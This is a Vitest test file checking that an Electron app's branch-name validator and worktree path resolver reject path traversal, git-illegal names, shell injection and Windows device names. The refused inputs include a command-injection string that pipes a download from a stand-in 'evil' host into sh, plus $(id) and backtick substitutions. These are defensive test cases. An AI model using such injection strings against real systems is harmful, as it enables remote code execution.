import '../../setup/home-guard';
import { describe, it, expect } from 'vitest';
import * as path from 'path';
import { isValidBranchName, resolveWorktreePath } from '../../../electron/utils/worktree-path';
import { isUnsafePathSegment } from '../../../electron/platform';

const PROJECT = '/Users/someone/proj';
// Resolved, as resolveWorktreePath resolves it: on Windows the project gains
// the current drive, and path.join alone left the expectation without one.
const ROOT = path.resolve(PROJECT, '.worktrees');

describe('isValidBranchName', () => {
  it('accepts the branch names people actually use', () => {
    for (const ok of ['main', 'feat/frontend', 'fix-123', 'release/1.5.0', 'a.b.c', 'v2']) {
      expect(isValidBranchName(ok), ok).toBe(true);
    }
  });

  it('refuses traversal, which the old regex allowed', () => {
    // /^[a-zA-Z0-9._\-\/]+$/ admits both '.' and '/', so it admits '..'.
    for (const bad of ['..', '../..', '../../../etc', 'a/../../../tmp', 'x/..']) {
      expect(isValidBranchName(bad), bad).toBe(false);
    }
  });

  it('refuses what git itself refuses', () => {
    for (const bad of ['/leading', 'trailing/', 'trailing.', 'x.lock', 'a//b', 'we@{1}', '-dashfirst']) {
      expect(isValidBranchName(bad), bad).toBe(false);
    }
  });

  it('refuses shell metacharacters, since the name is interpolated into a git command', () => {
    for (const bad of ["x'; curl evil|sh; '", 'a b', 'a;b', 'a$(id)', 'a`id`', 'a|b', 'a&b']) {
      expect(isValidBranchName(bad), bad).toBe(false);
    }
  });

  it('refuses empty and absurd lengths', () => {
    expect(isValidBranchName('')).toBe(false);
    expect(isValidBranchName('a'.repeat(201))).toBe(false);
  });
});

describe('resolveWorktreePath', () => {
  it('resolves a normal branch under the project .worktrees', () => {
    expect(resolveWorktreePath(PROJECT, 'feat/frontend')).toBe(path.join(ROOT, 'feat/frontend'));
  });

  it('returns undefined rather than a path outside the project', () => {
    // This was the bug: path.join(project, '.worktrees', '../../../etc') is
    // '/Users/etc'. fs.existsSync said yes, the caller skipped git entirely and
    // spawned the agent with that as its cwd.
    for (const escape of ['../../../etc', '..', 'a/../../../../tmp']) {
      expect(resolveWorktreePath(PROJECT, escape), escape).toBeUndefined();
    }
  });

  it('every path it does return is inside .worktrees', () => {
    for (const branch of ['main', 'feat/a/b/c', 'x.y']) {
      const resolved = resolveWorktreePath(PROJECT, branch)!;
      expect(resolved.startsWith(ROOT + path.sep)).toBe(true);
    }
  });
});

/**
 * Windows names a branch must not give a folder. The shape check
 * keeps out traversal, a drive, a backslash and a space; what it let through is
 * what Win32 itself rewrites. A device name opens the device, not a folder
 * (`feat/nul` is NUL, `com1.txt` is COM1), and a trailing dot or space is
 * dropped, so `a./b` is the folder `a/b` for git and Explorer while Node's
 * `\\?\` calls see `a.` literally: two names for one folder, or one name for
 * two.
 *
 * How it can fail, written before the code:
 * 1. a device name is accepted as a segment, in any case, first, last or in
 *    the middle, with or without an extension: CON, PRN, AUX, NUL, COM0-9,
 *    LPT0-9, COM and LPT with a superscript digit, CONIN$, CONOUT$;
 * 2. a segment ending in a dot or a space is accepted;
 * 3. a name that only starts like a device (CONSOLE, NULL, COM10, LPT) is refused;
 * 4. darwin and linux change: every one of these stays what it was there.
 */
describe('isValidBranchName on win32: what Win32 would rewrite', () => {
  const DEVICES = ['CON', 'PRN', 'AUX', 'NUL', ...Array.from({ length: 10 }, (_, i) => `COM${i}`), ...Array.from({ length: 10 }, (_, i) => `LPT${i}`), 'COM¹', 'COM²', 'COM³', 'LPT¹', 'LPT²', 'LPT³', 'CONIN$', 'CONOUT$'];
  const REFUSED = [
    ...DEVICES, ...DEVICES.map(d => d.toLowerCase()),
    'con.txt', 'Nul.tar.gz', 'feat/nul', 'feat/COM1/x', 'aux/feat', 'feat/lpt9.log', 'a/prn.', 'nul .txt',
    'a./b', 'feat/x.', 'a/b./c', 'a /b', 'feat/x ', 'a/b ./c',
  ];

  it('1, 2. refuses every device name and every trailing dot or space, in any segment', () => {
    for (const bad of REFUSED) expect(isValidBranchName(bad, 'win32'), bad).toBe(false);
    for (const seg of ['NUL', 'com1.txt', 'x.', 'x ', 'CONOUT$']) expect(isUnsafePathSegment(seg, 'win32'), seg).toBe(true);
  });

  it('3. accepts names that only look like one', () => {
    for (const ok of ['console', 'nullable/x', 'feat/com10', 'lpt', 'coms/1', 'feat/aux-panel', 'connect.v2', 'main', 'feat/frontend', 'release/1.5.0']) {
      expect(isValidBranchName(ok, 'win32'), ok).toBe(true);
    }
  });

  it('4. darwin and linux answer as they did', () => {
    for (const platform of ['darwin', 'linux'] as const) {
      for (const name of REFUSED) {
        // What the shape and git rules alone say, which is what they said before.
        const before = /^[A-Za-z0-9][A-Za-z0-9._/-]*$/.test(name) && !name.includes('..') && !name.includes('//')
          && !name.endsWith('/') && !name.endsWith('.') && !name.endsWith('.lock') && !name.includes('@{') && name.length <= 200;
        expect(isValidBranchName(name, platform), name).toBe(before);
      }
      expect(isUnsafePathSegment('NUL', platform)).toBe(false);
    }
  });

  it.runIf(process.platform === 'win32')('keeps them out of resolveWorktreePath on this machine', () => {
    for (const bad of ['feat/nul', 'CON', 'a./b']) expect(resolveWorktreePath('C:\\p', bad), bad).toBeUndefined();
    expect(resolveWorktreePath('C:\\p', 'feat/x')).toBe('C:\\p\\.worktrees\\feat\\x');
  });
});
